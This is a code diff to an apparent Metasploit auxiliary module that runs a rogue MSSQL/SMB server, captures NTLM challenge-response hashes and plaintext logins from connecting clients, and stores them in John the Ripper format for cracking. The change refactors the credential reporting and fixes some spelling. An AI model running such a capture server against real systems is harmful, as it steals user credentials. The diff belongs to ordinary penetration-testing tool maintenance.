@@ -6,11 +6,11 @@
 
 NTLM_CONST = Rex::Proto::NTLM::Constants
 NTLM_CRYPT = Rex::Proto::NTLM::Crypt
+NTLM_UTILS = Rex::Proto::NTLM::Utils
 MESSAGE = Rex::Proto::NTLM::Message
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::TcpServer
-  include Msf::Exploit::Remote::SMB::Server
   include Msf::Auxiliary::Report
 
   class Constants
@@ -49,7 +49,7 @@ class MetasploitModule < Msf::Auxiliary
 
     register_advanced_options(
       [
-        OptBool.new("SMB_EXTENDED_SECURITY", [ true, "Use smb extended security negociation, when set client will use ntlmssp, if not then client will use classic lanman authentification", false ]),
+        OptBool.new("SMB_EXTENDED_SECURITY", [ true, "Use smb extended security negotiation, when set client will use ntlmssp, if not then client will use classic lanman authentication", false ]),
         OptString.new('DOMAIN_NAME',         [ true, "The domain name used during smb exchange with smb extended security set ", "anonymous" ])
       ])
 
@@ -231,13 +231,13 @@ class MetasploitModule < Msf::Auxiliary
       capturedtime = Time.now.to_s
       case ntlm_ver
       when NTLM_CONST::NTLM_V1_RESPONSE
-        smb_db_type_hash = "smb_netv1_hash"
+        smb_db_type_hash = Metasploit::Framework::Hashes::JTR_NTLMV1
         capturelogmessage =
         "#{capturedtime}\nNTLMv1 Response Captured from #{host} \n" +
         "DOMAIN: #{domain} USER: #{user} \n" +
         "LMHASH:#{lm_hash_message ? lm_hash_message : "<NULL>"} \nNTHASH:#{nt_hash ? nt_hash : "<NULL>"}\n"
       when NTLM_CONST::NTLM_V2_RESPONSE
-        smb_db_type_hash = "smb_netv2_hash"
+        smb_db_type_hash = Metasploit::Framework::Hashes::JTR_NTLMV2
         capturelogmessage =
         "#{capturedtime}\nNTLMv2 Response Captured from #{host} \n" +
         "DOMAIN: #{domain} USER: #{user} \n" +
@@ -248,7 +248,7 @@ class MetasploitModule < Msf::Auxiliary
       when NTLM_CONST::NTLM_2_SESSION_RESPONSE
         #we can consider those as netv1 has they have the same size and i cracked the same way by cain/jtr
         #also 'real' netv1 is almost never seen nowadays except with smbmount or msf server capture
-        smb_db_type_hash = "smb_netv1_hash"
+        smb_db_type_hash = Metasploit::Framework::Hashes::JTR_NTLMV1
         capturelogmessage =
         "#{capturedtime}\nNTLM2_SESSION Response Captured from #{host} \n" +
         "DOMAIN: #{domain} USER: #{user} \n" +
@@ -264,19 +264,23 @@ class MetasploitModule < Msf::Auxiliary
       # DB reporting
       # Rem :  one report it as a smb_challenge on port 445 has breaking those hashes
       # will be mainly use for psexec / smb related exploit
-      report_auth_info(
-        :host  => arg[:ip],
-        :port => 445,
-        :sname => 'smb_client',
-        :user => user,
-        :pass => domain + ":" +
-        ( lm_hash + lm_cli_challenge.to_s ? lm_hash + lm_cli_challenge.to_s : "00" * 24 ) + ":" +
-        ( nt_hash + nt_cli_challenge.to_s ? nt_hash + nt_cli_challenge.to_s :  "00" * 24 ) + ":" +
-        datastore['CHALLENGE'].to_s,
-        :type => smb_db_type_hash,
-        :proof => "DOMAIN=#{domain}",
-        :source_type => "captured",
-        :active => true
+
+      jtr_hash = case smb_db_type_hash
+      when Metasploit::Framework::Hashes::JTR_NTLMV2
+        user + "::" + domain + ":" + datastore['CHALLENGE'].to_s + ":" + nt_hash + ":" + nt_cli_challenge.to_s
+      when Metasploit::Framework::Hashes::JTR_NTLMV1
+        user + "::" + domain + ":" + lm_cli_challenge.to_s + ":" + lm_hash + ":" + datastore['CHALLENGE']
+      end
+
+      report_cred(
+        ip: ip,
+        port: 445,
+        user: user,
+        sname: 'smb_client',
+        password: jtr_hash,
+        proof: "DOMAIN=#{domain}",
+        type: :nonreplayable_hash,
+        jtr_format: smb_db_type_hash
       )
       #if(datastore['LOGFILE'])
       #	File.open(datastore['LOGFILE'], "ab") {|fd| fd.puts(capturelogmessage + "\n")}
@@ -522,14 +526,13 @@ class MetasploitModule < Msf::Auxiliary
       if info[:isntlm?] == true
         mssql_send_ntlm_challenge(c, info)
       elsif info[:user] and info[:pass]
-        report_auth_info(
-        :host      => @state[c][:ip],
-        :port      => datastore['SRVPORT'],
-        :sname     => 'mssql_client',
-        :user      => info[:user],
-        :pass      => info[:pass],
-        :source_type => "captured",
-        :active    => true
+
+        report_cred(
+          ip: @state[c][:ip],
+          sname: 'mssql_client',
+          user: info[:user],
+          password: info[:pass],
+          type: :password
         )
 
         print_status("MSSQL LOGIN #{@state[c][:name]} #{info[:user]} / #{info[:pass]}")
@@ -542,5 +545,32 @@ class MetasploitModule < Msf::Auxiliary
 
   def on_client_close(c)
     @state.delete(c)
+  end
+
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port] || datastore['SRVPORT'],
+      service_name: opts[:sname],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: opts[:type],
+      jtr_format: opts[:jtr_format]
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
   end
 end
